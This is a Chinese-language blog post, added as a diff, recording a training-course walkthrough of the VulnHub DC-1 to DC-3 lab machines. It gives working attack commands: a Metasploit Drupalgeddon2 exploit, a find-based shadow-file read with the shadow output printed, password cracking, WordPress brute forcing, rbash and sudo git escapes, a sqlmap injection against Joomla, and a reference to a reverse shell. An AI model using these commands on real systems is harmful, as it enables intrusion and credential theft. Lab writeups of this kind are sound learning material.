@@ -1,0 +1,143 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=HandheldFriendly content="True"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Cache-Control content="no-transform"><meta http-equiv=Cache-Control content="no-siteapp"><meta name=generator content="Hugo 0.140.1"><link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon/favicon-16x16.png><link rel=manifest href=/favicon/site.webmanifest><link rel=mask-icon href=/favicon/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>DC 1-3 Writeup - zrquan</title>
+<meta name=author content="[4shen0ne]"><meta name=description content="A minimal Hugo theme with nice theme color."><meta name=keywords content="writeup,vulnhub"><meta property="og:title" content="DC 1-3 Writeup"><meta name=twitter:title content="DC 1-3 Writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://zrquan.github.io/posts/dc1-3/"><meta property="og:description" content="「 DC 」是 vulnhub 上的系列靶机，因为参加的某个培训课程用 DC1-3 这三个环境作为练习题目，所以在此记录一下复现的过程"><meta name=twitter:description content="「 DC 」是 vulnhub 上的系列靶机，因为参加的某个培训课程用 DC1-3 这三个环境作为练习题目，所以在此记录一下复现的过程"><meta property="og:image" content="https://zrquan.github.io/img/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zrquan.github.io/img/og.png"><meta property="article:published_time" content="2024-12-26T00:00:00+08:00"><meta property="article:modified_time" content="2024-12-26T00:00:00+08:00"><style>@media(prefers-color-scheme:dark){body[data-theme=auto] img{filter:brightness(60%)}}body[data-theme=dark] img{filter:brightness(60%)}</style><link rel=stylesheet href=https://zrquan.github.io/assets/css/fuji.min.4c44b7b7f176c7ea2e7d3a85a954d45c0d3e801e81eacbad84c7f9575b51e65dc11b59ff1a372389e8b4e0821d6bbb5a668fe9c3e77af9418acb79126a035a1f.css integrity="sha512-TES3t/F2x+oufTqFqVTUXA0+gB6B6suthMf5V1tR5l3BG1n/Gjcjiei04IIda7taZo/pw+d6+UGKy3kSagNaHw=="></head><body data-theme=auto data-theme-auto=false><script data-cfasync=false>var fujiThemeData=localStorage.getItem("fuji_data-theme");fujiThemeData?fujiThemeData!=="auto"&&document.body.setAttribute("data-theme",fujiThemeData==="dark"?"dark":"light"):localStorage.setItem("fuji_data-theme","auto")</script><header></header><main><div class="container-lg clearfix"><div class="col-12 col-md-9 float-left content"><article><h1 class="post-item post-title"><a href=https://zrquan.github.io/posts/dc1-3/>DC 1-3 Writeup</a></h1><div class="post-item post-meta"><span><i class="iconfont icon-today-sharp"></i>&nbsp;2024-12-26</span>
+<span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;1968 words</span>
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href=/tags/writeup>writeup</a>&nbsp;<a href=/tags/vulnhub>vulnhub</a>&nbsp;</span></div><div class="post-content markdown-body"><p><a href=https://www.vulnhub.com/series/dc,199/ target=_blank>「 DC 」是 vulnhub 上的系列靶机</a>，因为参加的某个培训课程用 DC1-3 这三个环境作为练习题目，所以在此记录一下复现的过程</p><h2 id=网络设置>网络设置</h2><p>靶机使用的是静态 IP 地址和虚拟机的「桥接网络」模式，这个模式会把宿主机所在网段的 IP 分配给虚拟机，而宿主机所在的网段未必和靶机设置的静态网段相同，这就导致网卡无法正常启动</p><p>那么首先要进入系统修改 /etc/network/interfaces 文件，改成 DHCP 的方式获取 IP。因为靶机没有提供系统用户密码，我们需要修改 <a href=https://zh.wikipedia.org/zh-cn/GNU_GRUB target=_blank>GRUB</a> 的启动参数进入系统<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup></p><p>以靶机的 Debian 系统为例（其他系统会有区别），进入启动菜单后按 e 编辑</p><figure><img src=/ox-hugo/_20241225_234416screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241225_234416screenshot.png></figure><p>找到 ro（ read-only ），改成「可写」权限并指定启动 shell</p><pre><code class=language-text>rw signie init=/bin/bash
+</code></pre><figure><img src=/ox-hugo/_20241225_234645screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241225_234645screenshot.png></figure><figure><img src=/ox-hugo/_20241225_234718screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241225_234718screenshot.png></figure><p>进入系统后编辑 /etc/network/interfaces，把 eth0 网卡改成 DHCP</p><pre><code class=language-text>allow-hotplug eth0
+iface eth0 inet dhcp
+</code></pre><p>自动获取 IP</p><pre><code class=language-text>dhclient eth0
+</code></pre><p>然后重启</p><h2 id=dc-1>DC-1</h2><p><code>nmap -sV</code> 收集端口信息</p><pre><code class=language-text>22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
+111/tcp open  rpcbind 2-4 (RPC #100000)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>80 端口是 Drupal CMS，应该是 CVE-2018-7600 但是我用 nuclei 没扫出来🤔</p><p>用 metasploit 的 drupal_drupalgeddon2 模块直接拿到 shell</p><pre><code class=language-shell>use unix/webapp/drupal_drupalgeddon2
+set RHOSTS 192.168.124.5
+run
+...
+meterpreter &gt; shell -it
+</code></pre><p>网站根目录 flag1.txt 中有提示</p><pre><code class=language-text>Every good CMS needs a config file - and so do you.
+</code></pre><p>根据提示搜一下配置文件</p><pre><code class=language-shell>find . -name settings*
+# ./sites/default/settings.php
+</code></pre><pre><code class=language-text>&lt;?php
+
+/**
+ *
+ * flag2
+ * Brute force and dictionary attacks aren't the
+ * only ways to gain access (and you WILL need access).
+ * What can you do with these credentials?
+ *
+ */
+
+$databases = array (
+  'default' =&gt;
+  array (
+    'default' =&gt;
+    array (
+      'database' =&gt; 'drupaldb',
+      'username' =&gt; 'dbuser',
+      'password' =&gt; 'R0ck3t',
+      'host' =&gt; 'localhost',
+      'port' =&gt; '',
+      'driver' =&gt; 'mysql',
+      'prefix' =&gt; '',
+    ),
+  ),
+);
+...
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 1:</span>
+settings.php</div><p>尝试登录 mysql，注意 <code>-p</code> 参数和密码间<a href=https://jacobtomlinson.dev/posts/2013/why-is-there-no-space-in-the-mysql-password-parameter/ target=_blank>不要有空格</a></p><pre><code class=language-text>mysql -udbuser -pR0ck3t
+</code></pre><p>在 drupaldb.users 表里找到三个用户，密码都是经过加密的</p><table><thead><tr><th>name</th><th>pass</th></tr></thead><tbody><tr><td>admin</td><td>$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</td></tr><tr><td>Fred</td><td>$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</td></tr><tr><td>test</td><td>$S$DTwWb.MjZ8ihU.gMo1vZu32NCKL5p6YJpDVqgorKBibR/bdHK6/k</td></tr></tbody></table><p>直接破解密文比较难，而且官方提供了密码的加密脚本，我们可以用脚本加密一个新密码替换 admin 的原密码<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup></p><pre><code class=language-text>www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 1234
+
+password: 1234          hash: $S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK
+</code></pre><pre><code class=language-text>mysql&gt; update drupaldb.users set pass='$S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK' where name='admin';
+</code></pre><p>修改密码后登录后台，在 Content 页找到 flag3，又是新的提示</p><pre><code class=language-text>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
+</code></pre><p>这里 PERMS 和 FIND 两个大写单词给了提示，应该是用 find 的 SUID 提权读取 shadow 文件内容</p><details><summary>find . -exec cat /etc/shadow \; -quit</summary><div class=details><pre><code class=language-text>root:$6$91zYUPrB$A/i0KqmGAi.forD5idrSFrDlPGLDoHr33g0gTfW8oJsCBptPsNRNoc0XoqkCwvFU4XMqrocm4KYtPBLqorFpW0:19823:0:99999:7:::
+daemon:*:17946:0:99999:7:::
+bin:*:17946:0:99999:7:::
+sys:*:17946:0:99999:7:::
+sync:*:17946:0:99999:7:::
+games:*:17946:0:99999:7:::
+man:*:17946:0:99999:7:::
+lp:*:17946:0:99999:7:::
+mail:*:17946:0:99999:7:::
+news:*:17946:0:99999:7:::
+uucp:*:17946:0:99999:7:::
+proxy:*:17946:0:99999:7:::
+www-data:*:17946:0:99999:7:::
+backup:*:17946:0:99999:7:::
+list:*:17946:0:99999:7:::
+irc:*:17946:0:99999:7:::
+gnats:*:17946:0:99999:7:::
+nobody:*:17946:0:99999:7:::
+libuuid:!:17946:0:99999:7:::
+Debian-exim:!:17946:0:99999:7:::
+statd:*:17946:0:99999:7:::
+messagebus:*:17946:0:99999:7:::
+sshd:*:17946:0:99999:7:::
+mysql:!:17946:0:99999:7:::
+flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::
+</code></pre></div></details><p>拿到 shadow 的内容后直接给 john 破解得到弱口令</p><pre><code class=language-text>❯ john dc1-shadow
+...
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+123456           (root)
+orange           (flag4)
+</code></pre><p>先 ssh 登录 root，然后找到 /root/thefinalflag.txt</p><pre><code class=language-text>Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+</code></pre><p>啊？通关了？那 flag4 是啥？</p><p>登录 flag4 有个提示 /home/flag4/flag4.txt 🤔</p><pre><code class=language-text>Can you use this same method to find or access the flag in root?
+
+Probably. But perhaps it's not that easy.  Or maybe it is?
+</code></pre><h2 id=dc-2>DC-2</h2><p>nmap 扫一下只扫到 80 端口，直接用 IP 访问会被重定向到 <code>http://dc-2/</code> ，需要修改 hosts 文件</p><p>进去后知道这是个 WordPress 站点，并且找到第一个提示（flag 1）</p><figure><img src=/ox-hugo/_20241226_092122screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_092122screenshot.png></figure><p><del>首先 nuclei 扫一下 WordPress，用 wpscan 也行，但是 arch 源仓库的 wpscan 貌似<a href=https://gitlab.archlinux.org/archlinux/packaging/packages/wpscan/-/issues/2 target=_blank>出了个 bug</a></del></p><figure><img src=/ox-hugo/_20241226_092508screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_092508screenshot.png></figure><p>还是用 wpscan 扫比较好，nuclei 着重漏洞「检测」而不是「利用」，扫出来的用户名不全</p><div class=notes><p>如何你和我一样用的是 Arch 系统，从源仓库下载的 wpscan 可能会出现错误</p><pre><code class=language-text>cannot load such file -- ffi_c
+</code></pre><p>直接用 gem（ruby 的包管理器）来下载就没问题了</p><pre><code class=language-text>gem install wpscan
+</code></pre></div><pre><code class=language-text>wpscan --url http://dc-2 -e
+</code></pre><figure><img src=/ox-hugo/_20241226_102417screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_102417screenshot.png></figure><p>扫出来一个登录页和用户名枚举漏洞，再联系到 flag1 提示的 <a href=https://github.com/digininja/CeWL target=_blank>cewl</a> 是一个字典生成工具，所以尝试对枚举出来的用户名进行暴力破解</p><p>先构建一个密码字典，然后结合 wpscan 扫出来的用户名暴力破解</p><pre><code class=language-shell>cewl -w pass.txt http://dc-2
+wpscan --url http://dc-2 -U admin,jerry,tom -P pass.txt
+</code></pre><p>tom 和 jerry 都扫出来了弱口令</p><figure><img src=/ox-hugo/_20241226_102937screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_102937screenshot.png></figure><p>登录进去找到新提示，似乎 WordPress 这条路是走不通的，得另辟蹊径</p><figure><img src=/ox-hugo/_20241226_094429screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_094429screenshot.png></figure><p>发现一开始用 nmap 的默认参数扫端口漏了一个，应该扫全端口的😅</p><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.10 ((Debian))</td></tr><tr><td>7744/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</td></tr></tbody></table><p>尝试一下发现 tom 的 wordpress 密码和 ssh 密码相同，直接登录</p><pre><code class=language-text>ssh tom@dc-2 -p 7744
+</code></pre><p>发现 shell 是 <a href=https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html target=_blank>rbash</a>，很多命令无法使用，可以用 <code>compgen -c</code> 看看可以执行的命令有哪些</p><p>看到可以运行 vi（其实运行的是 vim）那么参考 <a href=https://gtfobins.github.io/gtfobins/vim/ target=_blank>GTFOBins</a> 进行提权</p><pre><code class=language-text>vi --cmd ':set shell=/bin/bash|:shell'
+</code></pre><p>之后再执行命令会显示 <code>command not found</code> 但其实已经拿到功能完整的 bash shell 了，更新一下 PATH 环境变量即可执行常用命令</p><pre><code class=language-shell>export PATH=/bin:/sbin:/usr/bin:/usr/sbin
+cat flag3.txt
+# Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
+</code></pre><p>根据 flag3 的提示使用 su 切换到 jerry 用户，密码是之前扫出来的 wordpress 密码，读到 flag4（tom 也能读到）</p><pre><code class=language-shell>cat /home/jerry/flag4.txt
+# Good to see that you've made it this far - but you're not home yet.
+# You still need to get the final flag (the only flag that really counts!!!).
+# No hints here - you're on your own now.  :-)
+# Go on - git outta here!!!!
+</code></pre><p>还有最后一个 flag，而且提示了 git，自然想到<a href=https://gtfobins.github.io/gtfobins/git/ target=_blank>利用 git 提权</a></p><p>首先检查一下 jerry 的 sudo 列表，可以执行 git（tom 没有 sudo 权限）</p><pre><code class=language-shell>sudo -l
+# User jerry may run the following commands on DC-2:
+#     (root) NOPASSWD: /usr/bin/git
+</code></pre><p>虽然不允许设置 PAGER 环境变量，但可以先进入默认 pager 再执行命令</p><pre><code class=language-shell>sudo git -p help config
+!/bin/bash
+</code></pre><details><summary>cat /root/final-flag.txt</summary><div class=details><pre><code class=language-text> __    __     _ _       _                    _
+/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
+\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
+ \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
+  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/
+
+
+Congratulatons!!!
+
+A special thanks to all those who sent me tweets
+and provided me with feedback - it's all greatly
+appreciated.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+</code></pre></div></details><h2 id=dc-3>DC-3</h2><p>先扫一下全端口，这次确定只有一个 80，是一个 Joomla 站点</p><figure><img src=/ox-hugo/_20241226_145848screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_145848screenshot.png></figure><p>nuclei 直接扫出来后台和 CVE-2017-8917</p><figure><img src=/ox-hugo/_20241226_145936screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_145936screenshot.png></figure><p>用 sqlmap 翻一下数据库，找到 admin 的用户名密码</p><pre><code class=language-shell>sqlmap -u http://192.168.220.165/index.php\?option\=com_fields\&amp;view\=fields\&amp;layout\=modal\&amp;list\[fullordering\]\=x\* -D joomladb -T '#__users' -C name,username,password --dump --batch
+</code></pre><figure><img src=/ox-hugo/_20241226_153054screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_153054screenshot.png></figure><p>Joomla 的密码用 bcrypt 加密过，一开始我想的是像前面 DC-1 一样修改 admin 的密码，但不知道是不是表名有特殊符号的问题，用 sqlmap 一直没有修改成功。然后改用 john 破解出密码为 snoopy</p><pre><code class=language-text>echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' &gt; pass &amp;&amp; john pass
+</code></pre><p>拿到管理员密码后登录 joomla 后台，可以修改模板文件，通过 PHP 反弹 shell<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup></p><figure><img src=/ox-hugo/_20241226_194826screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_194826screenshot.png></figure><p>访问 /templates/beez3/error.php 页面触发，拿到 www-data 用户权限的 shell</p><p>下一步是提权，把 <a href=https://github.com/The-Z-Labs/linux-exploit-suggester target=_blank>linux-exploit-suggester</a> 脚本传上去检查一下，发现不少提权风险点，我这边用了 <a href=https://github.com/berdav/CVE-2021-4034 target=_blank>PwnKit</a></p><figure><img src=/ox-hugo/_20241226_195428screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_195428screenshot.png></figure><p>需要把 poc 源码传到靶机上面编译，不然可能因为 CPU 架构不同执行不了。提权成功后拿到 root 用户目录下的 flag</p><figure><img src=/ox-hugo/_20241226_195938screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_195938screenshot.png></figure><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://blog.csdn.net/qq_45290991/article/details/114189156 target=_blank>https://blog.csdn.net/qq_45290991/article/details/114189156</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://drupalchina.cn/node/2128 target=_blank>https://drupalchina.cn/node/2128</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href=https://www.leavesongs.com/PHP/backshell-via-php.html target=_blank>https://www.leavesongs.com/PHP/backshell-via-php.html</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div></article><div class="license markdown-body"><blockquote><p>Unless otherwise noted, the content of this site is licensed under <a rel=license href=http://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a>.</p></blockquote></div><div class=post-comment data-comment=disqus><span class=post-comment-notloaded><i class="iconfont icon-chatbox-ellipses-sharp"></i>&nbsp;Load comments</span><div id=disqus_thread style=display:none></div><script>function loadComment(){var t=document.querySelector(".post-comment"),n=function(){this.page.url="https://zrquan.github.io/posts/dc1-3/",this.page.identifier="dc1-3"},e=document.createElement("script");e.src="https://4shen0ne.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),document.querySelector("#disqus_thread").removeAttribute("style"),(document.body||document.head).appendChild(e),document.querySelector("span.post-comment-notloaded").setAttribute("style","display: none;")}</script></div></div><aside class="col-12 col-md-3 float-left sidebar"><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#网络设置>网络设置</a></li><li><a href=#dc-1>DC-1</a></li><li><a href=#dc-2>DC-2</a></li><li><a href=#dc-3>DC-3</a></li></ul></nav></div></aside></div><div class=btn><div class=btn-menu id=btn-menu><i class="iconfont icon-grid-sharp"></i></div><div class=btn-toggle-mode><i class="iconfont icon-contrast-sharp"></i></div><div class=btn-scroll-top><i class="iconfont icon-chevron-up-circle-sharp"></i></div></div><aside class=sidebar-mobile style=display:none><div class=sidebar-wrapper><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/zrquan target=_blank><span>GitHub</span></a></li><li><a href=https://notes-bice-five.vercel.app/ target=_blank><span>Notes</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>Ctf</a>
+</span><span><a href=/tags/cve/>Cve</a>
+</span><span><a href=/tags/deserialize/>Deserialize</a>
+</span><span><a href=/tags/emacs/>Emacs</a>
+</span><span><a href=/tags/fastjson/>Fastjson</a>
+</span><span><a href=/tags/hessian/>Hessian</a>
+</span><span><a href=/tags/java/>Java</a>
+</span><span><a href=/tags/kotlin/>Kotlin</a>
+</span><span><a href=/tags/org-mode/>Org-Mode</a>
+</span><span><a href=/tags/vulnhub/>Vulnhub</a>
+</span><span><a href=/tags/web/>Web</a>
+</span><span><a href=/tags/writeup/>Writeup</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#网络设置>网络设置</a></li><li><a href=#dc-1>DC-1</a></li><li><a href=#dc-2>DC-2</a></li><li><a href=#dc-3>DC-3</a></li></ul></nav></div></div></aside></main><footer><div class="container-lg clearfix"><div class="col-12 footer"><span>&copy; 2021-2024
+<a href=https://zrquan.github.io/>zrquan</a>
+| <a href=https://github.com/zrquan/zrquan.github.io>Source code</a>
+| Powered by <a href=https://github.com/andrew-aiken/hugo-theme-fuji/ target=_blank>Fuji</a> & <a href=https://gohugo.io/ target=_blank>Hugo</a></span></div></div></footer><script defer src=https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js></script><script defer src=/assets/js/fuji.min.js></script><script async src=https://unpkg.com/mermaid@8.2.3/dist/mermaid.min.js></script></body></html>
